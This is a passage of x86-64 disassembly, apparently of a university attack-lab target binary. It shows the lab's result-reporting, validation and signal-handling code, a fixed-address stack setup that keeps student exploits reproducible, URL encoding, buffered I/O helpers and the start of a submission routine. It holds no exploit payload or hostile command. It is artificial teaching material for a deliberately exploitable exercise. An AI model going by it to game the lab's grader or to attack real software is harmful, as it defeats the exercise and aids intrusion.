  401a44:	eb 06                	jmp    401a4c <notify_server+0x60>
  401a46:	41 b8 ff ff ff ff    	mov    $0xffffffff,%r8d
  401a4c:	85 db                	test   %ebx,%ebx
  401a4e:	74 07                	je     401a57 <notify_server+0x6b>
  401a50:	b9 d9 30 40 00       	mov    $0x4030d9,%ecx
  401a55:	eb 05                	jmp    401a5c <notify_server+0x70>
  401a57:	b9 de 30 40 00       	mov    $0x4030de,%ecx
  401a5c:	48 c7 44 24 08 20 45 	movq   $0x604520,0x8(%rsp)
  401a63:	60 00 
  401a65:	89 34 24             	mov    %esi,(%rsp)
  401a68:	8b 15 fa 26 20 00    	mov    0x2026fa(%rip),%edx        # 604168 <target_id>
  401a6e:	be e3 30 40 00       	mov    $0x4030e3,%esi
  401a73:	48 8d bc 24 10 20 00 	lea    0x2010(%rsp),%rdi
  401a7a:	00 
  401a7b:	b8 00 00 00 00       	mov    $0x0,%eax
  401a80:	e8 5b f3 ff ff       	callq  400de0 <sprintf@plt>
  401a85:	83 3d 1c 2a 20 00 00 	cmpl   $0x0,0x202a1c(%rip)        # 6044a8 <notify>
  401a8c:	74 78                	je     401b06 <notify_server+0x11a>
  401a8e:	85 db                	test   %ebx,%ebx
  401a90:	74 68                	je     401afa <notify_server+0x10e>
  401a92:	4c 8d 4c 24 10       	lea    0x10(%rsp),%r9
  401a97:	41 b8 00 00 00 00    	mov    $0x0,%r8d
  401a9d:	48 8d 8c 24 10 20 00 	lea    0x2010(%rsp),%rcx
  401aa4:	00 
  401aa5:	48 8b 15 c4 26 20 00 	mov    0x2026c4(%rip),%rdx        # 604170 <lab>
  401aac:	48 8b 35 c5 26 20 00 	mov    0x2026c5(%rip),%rsi        # 604178 <course>
  401ab3:	48 8b 3d a6 26 20 00 	mov    0x2026a6(%rip),%rdi        # 604160 <user_id>
  401aba:	e8 94 0f 00 00       	callq  402a53 <driver_post>
  401abf:	85 c0                	test   %eax,%eax
  401ac1:	79 1e                	jns    401ae1 <notify_server+0xf5>
  401ac3:	48 8d 74 24 10       	lea    0x10(%rsp),%rsi
  401ac8:	bf ff 30 40 00       	mov    $0x4030ff,%edi
  401acd:	b8 00 00 00 00       	mov    $0x0,%eax
  401ad2:	e8 a9 f1 ff ff       	callq  400c80 <printf@plt>
  401ad7:	bf 01 00 00 00       	mov    $0x1,%edi
  401adc:	e8 0f f3 ff ff       	callq  400df0 <exit@plt>
  401ae1:	bf 28 32 40 00       	mov    $0x403228,%edi
  401ae6:	e8 65 f1 ff ff       	callq  400c50 <puts@plt>
  401aeb:	bf 0b 31 40 00       	mov    $0x40310b,%edi
  401af0:	e8 5b f1 ff ff       	callq  400c50 <puts@plt>
  401af5:	e9 85 00 00 00       	jmpq   401b7f <notify_server+0x193>
  401afa:	bf 15 31 40 00       	mov    $0x403115,%edi
  401aff:	e8 4c f1 ff ff       	callq  400c50 <puts@plt>
  401b04:	eb 79                	jmp    401b7f <notify_server+0x193>
  401b06:	85 db                	test   %ebx,%ebx
  401b08:	74 08                	je     401b12 <notify_server+0x126>
  401b0a:	be d9 30 40 00       	mov    $0x4030d9,%esi
  401b0f:	90                   	nop
  401b10:	eb 05                	jmp    401b17 <notify_server+0x12b>
  401b12:	be de 30 40 00       	mov    $0x4030de,%esi
  401b17:	bf 60 32 40 00       	mov    $0x403260,%edi
  401b1c:	b8 00 00 00 00       	mov    $0x0,%eax
  401b21:	e8 5a f1 ff ff       	callq  400c80 <printf@plt>
  401b26:	48 8b 35 33 26 20 00 	mov    0x202633(%rip),%rsi        # 604160 <user_id>
  401b2d:	bf 1c 31 40 00       	mov    $0x40311c,%edi
  401b32:	b8 00 00 00 00       	mov    $0x0,%eax
  401b37:	e8 44 f1 ff ff       	callq  400c80 <printf@plt>
  401b3c:	48 8b 35 35 26 20 00 	mov    0x202635(%rip),%rsi        # 604178 <course>
  401b43:	bf 29 31 40 00       	mov    $0x403129,%edi
  401b48:	b8 00 00 00 00       	mov    $0x0,%eax
  401b4d:	e8 2e f1 ff ff       	callq  400c80 <printf@plt>
  401b52:	48 8b 35 17 26 20 00 	mov    0x202617(%rip),%rsi        # 604170 <lab>
  401b59:	bf 35 31 40 00       	mov    $0x403135,%edi
  401b5e:	b8 00 00 00 00       	mov    $0x0,%eax
  401b63:	e8 18 f1 ff ff       	callq  400c80 <printf@plt>
  401b68:	48 8d b4 24 10 20 00 	lea    0x2010(%rsp),%rsi
  401b6f:	00 
  401b70:	bf 3e 31 40 00       	mov    $0x40313e,%edi
  401b75:	b8 00 00 00 00       	mov    $0x0,%eax
  401b7a:	e8 01 f1 ff ff       	callq  400c80 <printf@plt>
  401b7f:	48 81 c4 10 40 00 00 	add    $0x4010,%rsp
  401b86:	5b                   	pop    %rbx
  401b87:	f3 c3                	repz retq 

0000000000401b89 <validate>:
  401b89:	53                   	push   %rbx
  401b8a:	89 fb                	mov    %edi,%ebx
  401b8c:	83 3d 75 29 20 00 00 	cmpl   $0x0,0x202975(%rip)        # 604508 <is_checker>
  401b93:	74 60                	je     401bf5 <validate+0x6c>
  401b95:	39 3d 61 29 20 00    	cmp    %edi,0x202961(%rip)        # 6044fc <vlevel>
  401b9b:	74 14                	je     401bb1 <validate+0x28>
  401b9d:	bf 4a 31 40 00       	mov    $0x40314a,%edi
  401ba2:	e8 a9 f0 ff ff       	callq  400c50 <puts@plt>
  401ba7:	b8 00 00 00 00       	mov    $0x0,%eax
  401bac:	e8 ba fd ff ff       	callq  40196b <check_fail>
  401bb1:	8b 35 41 29 20 00    	mov    0x202941(%rip),%esi        # 6044f8 <check_level>
  401bb7:	39 fe                	cmp    %edi,%esi
  401bb9:	74 1b                	je     401bd6 <validate+0x4d>
  401bbb:	89 fa                	mov    %edi,%edx
  401bbd:	bf 88 32 40 00       	mov    $0x403288,%edi
  401bc2:	b8 00 00 00 00       	mov    $0x0,%eax
  401bc7:	e8 b4 f0 ff ff       	callq  400c80 <printf@plt>
  401bcc:	b8 00 00 00 00       	mov    $0x0,%eax
  401bd1:	e8 95 fd ff ff       	callq  40196b <check_fail>
  401bd6:	0f be 35 4b 35 20 00 	movsbl 0x20354b(%rip),%esi        # 605128 <target_prefix>
  401bdd:	b9 20 45 60 00       	mov    $0x604520,%ecx
  401be2:	89 fa                	mov    %edi,%edx
  401be4:	bf 68 31 40 00       	mov    $0x403168,%edi
  401be9:	b8 00 00 00 00       	mov    $0x0,%eax
  401bee:	e8 8d f0 ff ff       	callq  400c80 <printf@plt>
  401bf3:	eb 44                	jmp    401c39 <validate+0xb0>
  401bf5:	39 3d 01 29 20 00    	cmp    %edi,0x202901(%rip)        # 6044fc <vlevel>
  401bfb:	74 18                	je     401c15 <validate+0x8c>
  401bfd:	bf 4a 31 40 00       	mov    $0x40314a,%edi
  401c02:	e8 49 f0 ff ff       	callq  400c50 <puts@plt>
  401c07:	89 de                	mov    %ebx,%esi
  401c09:	bf 00 00 00 00       	mov    $0x0,%edi
  401c0e:	e8 d9 fd ff ff       	callq  4019ec <notify_server>
  401c13:	eb 24                	jmp    401c39 <validate+0xb0>
  401c15:	0f be 15 0c 35 20 00 	movsbl 0x20350c(%rip),%edx        # 605128 <target_prefix>
  401c1c:	89 fe                	mov    %edi,%esi
  401c1e:	bf b0 32 40 00       	mov    $0x4032b0,%edi
  401c23:	b8 00 00 00 00       	mov    $0x0,%eax
  401c28:	e8 53 f0 ff ff       	callq  400c80 <printf@plt>
  401c2d:	89 de                	mov    %ebx,%esi
  401c2f:	bf 01 00 00 00       	mov    $0x1,%edi
  401c34:	e8 b3 fd ff ff       	callq  4019ec <notify_server>
  401c39:	5b                   	pop    %rbx
  401c3a:	c3                   	retq   

0000000000401c3b <fail>:
  401c3b:	48 83 ec 08          	sub    $0x8,%rsp
  401c3f:	83 3d c2 28 20 00 00 	cmpl   $0x0,0x2028c2(%rip)        # 604508 <is_checker>
  401c46:	74 0a                	je     401c52 <fail+0x17>
  401c48:	b8 00 00 00 00       	mov    $0x0,%eax
  401c4d:	e8 19 fd ff ff       	callq  40196b <check_fail>
  401c52:	89 fe                	mov    %edi,%esi
  401c54:	bf 00 00 00 00       	mov    $0x0,%edi
  401c59:	e8 8e fd ff ff       	callq  4019ec <notify_server>
  401c5e:	48 83 c4 08          	add    $0x8,%rsp
  401c62:	c3                   	retq   

0000000000401c63 <bushandler>:
  401c63:	48 83 ec 08          	sub    $0x8,%rsp
  401c67:	83 3d 9a 28 20 00 00 	cmpl   $0x0,0x20289a(%rip)        # 604508 <is_checker>
  401c6e:	74 14                	je     401c84 <bushandler+0x21>
  401c70:	bf 7d 31 40 00       	mov    $0x40317d,%edi
  401c75:	e8 d6 ef ff ff       	callq  400c50 <puts@plt>
  401c7a:	b8 00 00 00 00       	mov    $0x0,%eax
  401c7f:	e8 e7 fc ff ff       	callq  40196b <check_fail>
  401c84:	bf e8 32 40 00       	mov    $0x4032e8,%edi
  401c89:	e8 c2 ef ff ff       	callq  400c50 <puts@plt>
  401c8e:	bf 87 31 40 00       	mov    $0x403187,%edi
  401c93:	e8 b8 ef ff ff       	callq  400c50 <puts@plt>
  401c98:	be 00 00 00 00       	mov    $0x0,%esi
  401c9d:	bf 00 00 00 00       	mov    $0x0,%edi
  401ca2:	e8 45 fd ff ff       	callq  4019ec <notify_server>
  401ca7:	bf 01 00 00 00       	mov    $0x1,%edi
  401cac:	e8 3f f1 ff ff       	callq  400df0 <exit@plt>

0000000000401cb1 <seghandler>:
  401cb1:	48 83 ec 08          	sub    $0x8,%rsp
  401cb5:	83 3d 4c 28 20 00 00 	cmpl   $0x0,0x20284c(%rip)        # 604508 <is_checker>
  401cbc:	74 14                	je     401cd2 <seghandler+0x21>
  401cbe:	bf 9d 31 40 00       	mov    $0x40319d,%edi
  401cc3:	e8 88 ef ff ff       	callq  400c50 <puts@plt>
  401cc8:	b8 00 00 00 00       	mov    $0x0,%eax
  401ccd:	e8 99 fc ff ff       	callq  40196b <check_fail>
  401cd2:	bf 08 33 40 00       	mov    $0x403308,%edi
  401cd7:	e8 74 ef ff ff       	callq  400c50 <puts@plt>
  401cdc:	bf 87 31 40 00       	mov    $0x403187,%edi
  401ce1:	e8 6a ef ff ff       	callq  400c50 <puts@plt>
  401ce6:	be 00 00 00 00       	mov    $0x0,%esi
  401ceb:	bf 00 00 00 00       	mov    $0x0,%edi
  401cf0:	e8 f7 fc ff ff       	callq  4019ec <notify_server>
  401cf5:	bf 01 00 00 00       	mov    $0x1,%edi
  401cfa:	e8 f1 f0 ff ff       	callq  400df0 <exit@plt>

0000000000401cff <illegalhandler>:
  401cff:	48 83 ec 08          	sub    $0x8,%rsp
  401d03:	83 3d fe 27 20 00 00 	cmpl   $0x0,0x2027fe(%rip)        # 604508 <is_checker>
  401d0a:	74 14                	je     401d20 <illegalhandler+0x21>
  401d0c:	bf b0 31 40 00       	mov    $0x4031b0,%edi
  401d11:	e8 3a ef ff ff       	callq  400c50 <puts@plt>
  401d16:	b8 00 00 00 00       	mov    $0x0,%eax
  401d1b:	e8 4b fc ff ff       	callq  40196b <check_fail>
  401d20:	bf 30 33 40 00       	mov    $0x403330,%edi
  401d25:	e8 26 ef ff ff       	callq  400c50 <puts@plt>
  401d2a:	bf 87 31 40 00       	mov    $0x403187,%edi
  401d2f:	e8 1c ef ff ff       	callq  400c50 <puts@plt>
  401d34:	be 00 00 00 00       	mov    $0x0,%esi
  401d39:	bf 00 00 00 00       	mov    $0x0,%edi
  401d3e:	e8 a9 fc ff ff       	callq  4019ec <notify_server>
  401d43:	bf 01 00 00 00       	mov    $0x1,%edi
  401d48:	e8 a3 f0 ff ff       	callq  400df0 <exit@plt>

0000000000401d4d <sigalrmhandler>:
  401d4d:	48 83 ec 08          	sub    $0x8,%rsp
  401d51:	83 3d b0 27 20 00 00 	cmpl   $0x0,0x2027b0(%rip)        # 604508 <is_checker>
  401d58:	74 14                	je     401d6e <sigalrmhandler+0x21>
  401d5a:	bf c4 31 40 00       	mov    $0x4031c4,%edi
  401d5f:	e8 ec ee ff ff       	callq  400c50 <puts@plt>
  401d64:	b8 00 00 00 00       	mov    $0x0,%eax
  401d69:	e8 fd fb ff ff       	callq  40196b <check_fail>
  401d6e:	be 05 00 00 00       	mov    $0x5,%esi
  401d73:	bf 60 33 40 00       	mov    $0x403360,%edi
  401d78:	b8 00 00 00 00       	mov    $0x0,%eax
  401d7d:	e8 fe ee ff ff       	callq  400c80 <printf@plt>
  401d82:	be 00 00 00 00       	mov    $0x0,%esi
  401d87:	bf 00 00 00 00       	mov    $0x0,%edi
  401d8c:	e8 5b fc ff ff       	callq  4019ec <notify_server>
  401d91:	bf 01 00 00 00       	mov    $0x1,%edi
  401d96:	e8 55 f0 ff ff       	callq  400df0 <exit@plt>

0000000000401d9b <launch>:
  401d9b:	55                   	push   %rbp
  401d9c:	48 89 e5             	mov    %rsp,%rbp
  401d9f:	48 89 fa             	mov    %rdi,%rdx
  401da2:	48 8d 47 1e          	lea    0x1e(%rdi),%rax
  401da6:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
  401daa:	48 29 c4             	sub    %rax,%rsp
  401dad:	48 8d 7c 24 0f       	lea    0xf(%rsp),%rdi
  401db2:	48 83 e7 f0          	and    $0xfffffffffffffff0,%rdi
  401db6:	be f4 00 00 00       	mov    $0xf4,%esi
  401dbb:	e8 d0 ee ff ff       	callq  400c90 <memset@plt>
  401dc0:	48 8b 05 f9 26 20 00 	mov    0x2026f9(%rip),%rax        # 6044c0 <stdin@@GLIBC_2.2.5>
  401dc7:	48 39 05 22 27 20 00 	cmp    %rax,0x202722(%rip)        # 6044f0 <infile>
  401dce:	75 0f                	jne    401ddf <launch+0x44>
  401dd0:	bf cc 31 40 00       	mov    $0x4031cc,%edi
  401dd5:	b8 00 00 00 00       	mov    $0x0,%eax
  401dda:	e8 a1 ee ff ff       	callq  400c80 <printf@plt>
  401ddf:	c7 05 13 27 20 00 00 	movl   $0x0,0x202713(%rip)        # 6044fc <vlevel>
  401de6:	00 00 00 
  401de9:	b8 00 00 00 00       	mov    $0x0,%eax
  401dee:	e8 e1 fa ff ff       	callq  4018d4 <test>
  401df3:	83 3d 0e 27 20 00 00 	cmpl   $0x0,0x20270e(%rip)        # 604508 <is_checker>
  401dfa:	74 14                	je     401e10 <launch+0x75>
  401dfc:	bf d9 31 40 00       	mov    $0x4031d9,%edi
  401e01:	e8 4a ee ff ff       	callq  400c50 <puts@plt>
  401e06:	b8 00 00 00 00       	mov    $0x0,%eax
  401e0b:	e8 5b fb ff ff       	callq  40196b <check_fail>
  401e10:	bf e4 31 40 00       	mov    $0x4031e4,%edi
  401e15:	e8 36 ee ff ff       	callq  400c50 <puts@plt>
  401e1a:	c9                   	leaveq 
  401e1b:	c3                   	retq   

0000000000401e1c <stable_launch>:
  401e1c:	53                   	push   %rbx
  401e1d:	48 89 3d c4 26 20 00 	mov    %rdi,0x2026c4(%rip)        # 6044e8 <global_offset>
  401e24:	41 b9 00 00 00 00    	mov    $0x0,%r9d
  401e2a:	41 b8 00 00 00 00    	mov    $0x0,%r8d
  401e30:	b9 32 01 00 00       	mov    $0x132,%ecx
  401e35:	ba 07 00 00 00       	mov    $0x7,%edx
  401e3a:	be 00 00 10 00       	mov    $0x100000,%esi
  401e3f:	bf 00 60 58 55       	mov    $0x55586000,%edi
  401e44:	e8 27 ee ff ff       	callq  400c70 <mmap@plt>
  401e49:	48 89 c3             	mov    %rax,%rbx
  401e4c:	48 3d 00 60 58 55    	cmp    $0x55586000,%rax
  401e52:	74 32                	je     401e86 <stable_launch+0x6a>
  401e54:	be 00 00 10 00       	mov    $0x100000,%esi
  401e59:	48 89 c7             	mov    %rax,%rdi
  401e5c:	e8 1f ef ff ff       	callq  400d80 <munmap@plt>
  401e61:	ba 00 60 58 55       	mov    $0x55586000,%edx
  401e66:	be 98 33 40 00       	mov    $0x403398,%esi
  401e6b:	48 8b 3d 5e 26 20 00 	mov    0x20265e(%rip),%rdi        # 6044d0 <stderr@@GLIBC_2.2.5>
  401e72:	b8 00 00 00 00       	mov    $0x0,%eax
  401e77:	e8 84 ee ff ff       	callq  400d00 <fprintf@plt>
  401e7c:	bf 01 00 00 00       	mov    $0x1,%edi
  401e81:	e8 6a ef ff ff       	callq  400df0 <exit@plt>
  401e86:	48 8d 90 f8 ff 0f 00 	lea    0xffff8(%rax),%rdx
  401e8d:	48 89 15 9c 32 20 00 	mov    %rdx,0x20329c(%rip)        # 605130 <stack_top>
  401e94:	48 89 e0             	mov    %rsp,%rax
  401e97:	48 89 d4             	mov    %rdx,%rsp
  401e9a:	48 89 c2             	mov    %rax,%rdx
  401e9d:	48 89 15 3c 26 20 00 	mov    %rdx,0x20263c(%rip)        # 6044e0 <global_save_stack>
  401ea4:	48 8b 3d 3d 26 20 00 	mov    0x20263d(%rip),%rdi        # 6044e8 <global_offset>
  401eab:	e8 eb fe ff ff       	callq  401d9b <launch>
  401eb0:	48 8b 05 29 26 20 00 	mov    0x202629(%rip),%rax        # 6044e0 <global_save_stack>
  401eb7:	48 89 c4             	mov    %rax,%rsp
  401eba:	be 00 00 10 00       	mov    $0x100000,%esi
  401ebf:	48 89 df             	mov    %rbx,%rdi
  401ec2:	e8 b9 ee ff ff       	callq  400d80 <munmap@plt>
  401ec7:	5b                   	pop    %rbx
  401ec8:	c3                   	retq   
  401ec9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000401ed0 <rio_readinitb>:
  401ed0:	89 37                	mov    %esi,(%rdi)
  401ed2:	c7 47 04 00 00 00 00 	movl   $0x0,0x4(%rdi)
  401ed9:	48 8d 47 10          	lea    0x10(%rdi),%rax
  401edd:	48 89 47 08          	mov    %rax,0x8(%rdi)
  401ee1:	c3                   	retq   

0000000000401ee2 <sigalrm_handler>:
  401ee2:	48 83 ec 08          	sub    $0x8,%rsp
  401ee6:	ba 00 00 00 00       	mov    $0x0,%edx
  401eeb:	be d0 33 40 00       	mov    $0x4033d0,%esi
  401ef0:	48 8b 3d d9 25 20 00 	mov    0x2025d9(%rip),%rdi        # 6044d0 <stderr@@GLIBC_2.2.5>
  401ef7:	b8 00 00 00 00       	mov    $0x0,%eax
  401efc:	e8 ff ed ff ff       	callq  400d00 <fprintf@plt>
  401f01:	bf 01 00 00 00       	mov    $0x1,%edi
  401f06:	e8 e5 ee ff ff       	callq  400df0 <exit@plt>

0000000000401f0b <urlencode>:
  401f0b:	41 54                	push   %r12
  401f0d:	55                   	push   %rbp
  401f0e:	53                   	push   %rbx
  401f0f:	48 83 ec 10          	sub    $0x10,%rsp
  401f13:	48 89 fb             	mov    %rdi,%rbx
  401f16:	48 89 f5             	mov    %rsi,%rbp
  401f19:	b8 00 00 00 00       	mov    $0x0,%eax
  401f1e:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
  401f25:	f2 ae                	repnz scas %es:(%rdi),%al
  401f27:	48 f7 d1             	not    %rcx
  401f2a:	8d 41 ff             	lea    -0x1(%rcx),%eax
  401f2d:	e9 93 00 00 00       	jmpq   401fc5 <urlencode+0xba>
  401f32:	0f b6 13             	movzbl (%rbx),%edx
  401f35:	80 fa 2a             	cmp    $0x2a,%dl
  401f38:	0f 94 c1             	sete   %cl
  401f3b:	80 fa 2d             	cmp    $0x2d,%dl
  401f3e:	0f 94 c0             	sete   %al
  401f41:	08 c1                	or     %al,%cl
  401f43:	75 1f                	jne    401f64 <urlencode+0x59>
  401f45:	80 fa 2e             	cmp    $0x2e,%dl
  401f48:	74 1a                	je     401f64 <urlencode+0x59>
  401f4a:	80 fa 5f             	cmp    $0x5f,%dl
  401f4d:	74 15                	je     401f64 <urlencode+0x59>
  401f4f:	8d 42 d0             	lea    -0x30(%rdx),%eax
  401f52:	3c 09                	cmp    $0x9,%al
  401f54:	76 0e                	jbe    401f64 <urlencode+0x59>
  401f56:	8d 42 bf             	lea    -0x41(%rdx),%eax
  401f59:	3c 19                	cmp    $0x19,%al
  401f5b:	76 07                	jbe    401f64 <urlencode+0x59>
  401f5d:	8d 42 9f             	lea    -0x61(%rdx),%eax
  401f60:	3c 19                	cmp    $0x19,%al
  401f62:	77 09                	ja     401f6d <urlencode+0x62>
  401f64:	88 55 00             	mov    %dl,0x0(%rbp)
  401f67:	48 8d 6d 01          	lea    0x1(%rbp),%rbp
  401f6b:	eb 51                	jmp    401fbe <urlencode+0xb3>
  401f6d:	80 fa 20             	cmp    $0x20,%dl
  401f70:	75 0a                	jne    401f7c <urlencode+0x71>
  401f72:	c6 45 00 2b          	movb   $0x2b,0x0(%rbp)
  401f76:	48 8d 6d 01          	lea    0x1(%rbp),%rbp
  401f7a:	eb 42                	jmp    401fbe <urlencode+0xb3>
  401f7c:	8d 42 e0             	lea    -0x20(%rdx),%eax
  401f7f:	3c 5f                	cmp    $0x5f,%al
  401f81:	0f 96 c1             	setbe  %cl
  401f84:	80 fa 09             	cmp    $0x9,%dl
  401f87:	0f 94 c0             	sete   %al
  401f8a:	08 c1                	or     %al,%cl
  401f8c:	74 45                	je     401fd3 <urlencode+0xc8>
  401f8e:	0f b6 d2             	movzbl %dl,%edx
  401f91:	be 68 34 40 00       	mov    $0x403468,%esi
  401f96:	48 89 e7             	mov    %rsp,%rdi
  401f99:	b8 00 00 00 00       	mov    $0x0,%eax
  401f9e:	e8 3d ee ff ff       	callq  400de0 <sprintf@plt>
  401fa3:	0f b6 04 24          	movzbl (%rsp),%eax
  401fa7:	88 45 00             	mov    %al,0x0(%rbp)
  401faa:	0f b6 44 24 01       	movzbl 0x1(%rsp),%eax
  401faf:	88 45 01             	mov    %al,0x1(%rbp)
  401fb2:	0f b6 44 24 02       	movzbl 0x2(%rsp),%eax
  401fb7:	88 45 02             	mov    %al,0x2(%rbp)
  401fba:	48 8d 6d 03          	lea    0x3(%rbp),%rbp
  401fbe:	48 83 c3 01          	add    $0x1,%rbx
  401fc2:	44 89 e0             	mov    %r12d,%eax
  401fc5:	44 8d 60 ff          	lea    -0x1(%rax),%r12d
  401fc9:	85 c0                	test   %eax,%eax
  401fcb:	0f 85 61 ff ff ff    	jne    401f32 <urlencode+0x27>
  401fd1:	eb 05                	jmp    401fd8 <urlencode+0xcd>
  401fd3:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  401fd8:	48 83 c4 10          	add    $0x10,%rsp
  401fdc:	5b                   	pop    %rbx
  401fdd:	5d                   	pop    %rbp
  401fde:	41 5c                	pop    %r12
  401fe0:	c3                   	retq   

0000000000401fe1 <rio_writen>:
  401fe1:	41 55                	push   %r13
  401fe3:	41 54                	push   %r12
  401fe5:	55                   	push   %rbp
  401fe6:	53                   	push   %rbx
  401fe7:	48 83 ec 08          	sub    $0x8,%rsp
  401feb:	41 89 fc             	mov    %edi,%r12d
  401fee:	48 89 f5             	mov    %rsi,%rbp
  401ff1:	49 89 d5             	mov    %rdx,%r13
  401ff4:	48 89 d3             	mov    %rdx,%rbx
  401ff7:	eb 28                	jmp    402021 <rio_writen+0x40>
  401ff9:	48 89 da             	mov    %rbx,%rdx
  401ffc:	48 89 ee             	mov    %rbp,%rsi
  401fff:	44 89 e7             	mov    %r12d,%edi
  402002:	e8 59 ec ff ff       	callq  400c60 <write@plt>
  402007:	48 85 c0             	test   %rax,%rax
  40200a:	7f 0f                	jg     40201b <rio_writen+0x3a>
  40200c:	e8 ff eb ff ff       	callq  400c10 <__errno_location@plt>
  402011:	83 38 04             	cmpl   $0x4,(%rax)
  402014:	75 15                	jne    40202b <rio_writen+0x4a>
  402016:	b8 00 00 00 00       	mov    $0x0,%eax
  40201b:	48 29 c3             	sub    %rax,%rbx
  40201e:	48 01 c5             	add    %rax,%rbp
  402021:	48 85 db             	test   %rbx,%rbx
  402024:	75 d3                	jne    401ff9 <rio_writen+0x18>
  402026:	4c 89 e8             	mov    %r13,%rax
  402029:	eb 07                	jmp    402032 <rio_writen+0x51>
  40202b:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
  402032:	48 83 c4 08          	add    $0x8,%rsp
  402036:	5b                   	pop    %rbx
  402037:	5d                   	pop    %rbp
  402038:	41 5c                	pop    %r12
  40203a:	41 5d                	pop    %r13
  40203c:	c3                   	retq   

000000000040203d <rio_read>:
  40203d:	41 56                	push   %r14
  40203f:	41 55                	push   %r13
  402041:	41 54                	push   %r12
  402043:	55                   	push   %rbp
  402044:	53                   	push   %rbx
  402045:	48 89 fb             	mov    %rdi,%rbx
  402048:	49 89 f6             	mov    %rsi,%r14
  40204b:	49 89 d5             	mov    %rdx,%r13
  40204e:	4c 8d 67 10          	lea    0x10(%rdi),%r12
  402052:	eb 2a                	jmp    40207e <rio_read+0x41>
  402054:	ba 00 20 00 00       	mov    $0x2000,%edx
  402059:	4c 89 e6             	mov    %r12,%rsi
  40205c:	8b 3b                	mov    (%rbx),%edi
  40205e:	e8 5d ec ff ff       	callq  400cc0 <read@plt>
  402063:	89 43 04             	mov    %eax,0x4(%rbx)
  402066:	85 c0                	test   %eax,%eax
  402068:	79 0c                	jns    402076 <rio_read+0x39>
  40206a:	e8 a1 eb ff ff       	callq  400c10 <__errno_location@plt>
  40206f:	83 38 04             	cmpl   $0x4,(%rax)
  402072:	74 0a                	je     40207e <rio_read+0x41>
  402074:	eb 37                	jmp    4020ad <rio_read+0x70>
  402076:	85 c0                	test   %eax,%eax
  402078:	74 3c                	je     4020b6 <rio_read+0x79>
  40207a:	4c 89 63 08          	mov    %r12,0x8(%rbx)
  40207e:	8b 6b 04             	mov    0x4(%rbx),%ebp
  402081:	85 ed                	test   %ebp,%ebp
  402083:	7e cf                	jle    402054 <rio_read+0x17>
  402085:	89 e8                	mov    %ebp,%eax
  402087:	4c 39 e8             	cmp    %r13,%rax
  40208a:	72 03                	jb     40208f <rio_read+0x52>
  40208c:	44 89 ed             	mov    %r13d,%ebp
  40208f:	4c 63 e5             	movslq %ebp,%r12
  402092:	48 8b 73 08          	mov    0x8(%rbx),%rsi
  402096:	4c 89 e2             	mov    %r12,%rdx
  402099:	4c 89 f7             	mov    %r14,%rdi
  40209c:	e8 8f ec ff ff       	callq  400d30 <memcpy@plt>
  4020a1:	4c 01 63 08          	add    %r12,0x8(%rbx)
  4020a5:	29 6b 04             	sub    %ebp,0x4(%rbx)
  4020a8:	4c 89 e0             	mov    %r12,%rax
  4020ab:	eb 0e                	jmp    4020bb <rio_read+0x7e>
  4020ad:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
  4020b4:	eb 05                	jmp    4020bb <rio_read+0x7e>
  4020b6:	b8 00 00 00 00       	mov    $0x0,%eax
  4020bb:	5b                   	pop    %rbx
  4020bc:	5d                   	pop    %rbp
  4020bd:	41 5c                	pop    %r12
  4020bf:	41 5d                	pop    %r13
  4020c1:	41 5e                	pop    %r14
  4020c3:	c3                   	retq   

00000000004020c4 <rio_readlineb>:
  4020c4:	41 55                	push   %r13
  4020c6:	41 54                	push   %r12
  4020c8:	55                   	push   %rbp
  4020c9:	53                   	push   %rbx
  4020ca:	48 83 ec 18          	sub    $0x18,%rsp
  4020ce:	49 89 fd             	mov    %rdi,%r13
  4020d1:	48 89 f5             	mov    %rsi,%rbp
  4020d4:	49 89 d4             	mov    %rdx,%r12
  4020d7:	bb 01 00 00 00       	mov    $0x1,%ebx
  4020dc:	eb 3d                	jmp    40211b <rio_readlineb+0x57>
  4020de:	ba 01 00 00 00       	mov    $0x1,%edx
  4020e3:	48 8d 74 24 0f       	lea    0xf(%rsp),%rsi
  4020e8:	4c 89 ef             	mov    %r13,%rdi
  4020eb:	e8 4d ff ff ff       	callq  40203d <rio_read>
  4020f0:	83 f8 01             	cmp    $0x1,%eax
  4020f3:	75 12                	jne    402107 <rio_readlineb+0x43>
  4020f5:	48 8d 55 01          	lea    0x1(%rbp),%rdx
  4020f9:	0f b6 44 24 0f       	movzbl 0xf(%rsp),%eax
  4020fe:	88 45 00             	mov    %al,0x0(%rbp)
  402101:	3c 0a                	cmp    $0xa,%al
  402103:	75 0f                	jne    402114 <rio_readlineb+0x50>
  402105:	eb 1b                	jmp    402122 <rio_readlineb+0x5e>
  402107:	85 c0                	test   %eax,%eax
  402109:	75 23                	jne    40212e <rio_readlineb+0x6a>
  40210b:	48 83 fb 01          	cmp    $0x1,%rbx
  40210f:	90                   	nop
  402110:	75 13                	jne    402125 <rio_readlineb+0x61>
  402112:	eb 23                	jmp    402137 <rio_readlineb+0x73>
  402114:	48 83 c3 01          	add    $0x1,%rbx
  402118:	48 89 d5             	mov    %rdx,%rbp
  40211b:	4c 39 e3             	cmp    %r12,%rbx
  40211e:	72 be                	jb     4020de <rio_readlineb+0x1a>
  402120:	eb 03                	jmp    402125 <rio_readlineb+0x61>
  402122:	48 89 d5             	mov    %rdx,%rbp
  402125:	c6 45 00 00          	movb   $0x0,0x0(%rbp)
  402129:	48 89 d8             	mov    %rbx,%rax
  40212c:	eb 0e                	jmp    40213c <rio_readlineb+0x78>
  40212e:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
  402135:	eb 05                	jmp    40213c <rio_readlineb+0x78>
  402137:	b8 00 00 00 00       	mov    $0x0,%eax
  40213c:	48 83 c4 18          	add    $0x18,%rsp
  402140:	5b                   	pop    %rbx
  402141:	5d                   	pop    %rbp
  402142:	41 5c                	pop    %r12
  402144:	41 5d                	pop    %r13
  402146:	c3                   	retq   

0000000000402147 <submitr>:
  402147:	41 57                	push   %r15
  402149:	41 56                	push   %r14
  40214b:	41 55                	push   %r13
  40214d:	41 54                	push   %r12
  40214f:	55                   	push   %rbp
  402150:	53                   	push   %rbx
  402151:	48 81 ec 48 a0 00 00 	sub    $0xa048,%rsp
  402158:	49 89 fc             	mov    %rdi,%r12
  40215b:	89 74 24 04          	mov    %esi,0x4(%rsp)
